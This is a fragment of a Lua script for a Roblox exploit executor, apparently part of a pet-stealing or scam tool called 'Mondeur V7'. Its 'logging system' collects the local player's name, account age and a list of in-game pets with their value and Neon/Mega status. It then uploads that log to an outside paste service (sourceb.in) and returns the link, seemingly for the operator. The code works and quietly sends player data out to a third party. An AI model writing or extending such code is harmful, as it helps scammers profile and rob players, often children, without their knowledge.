-- [[ 3. LOGGING SYSTEM (SOURCEBIN) ]] --
local function uploadToSourceBin(pets)
    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if not request then return nil end

    local log = "=== MONDEUR V7 LOG ===\nPlayer: " .. LocalPlayer.Name .. "\nAge: " .. LocalPlayer.AccountAge .. "\n\n"
    for i, p in ipairs(pets) do
        log = log .. string.format("[%d] %s | Value: %d | Neon: %s | Mega: %s\n", i, p.name, p.value, tostring(p.isNeon), tostring(p.isMega))
    end

    local ok, res = pcall(function()
        return request({
            Url = "https://sourceb.in/api/bins",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({ files = {{content = log}} })
        })
    end)
    if ok and res and res.StatusCode == 200 then
        local data = HttpService:JSONDecode(res.Body)
        if data and data.key then return "https://srcb.in/" .. data.key end
    end
    return nil
end

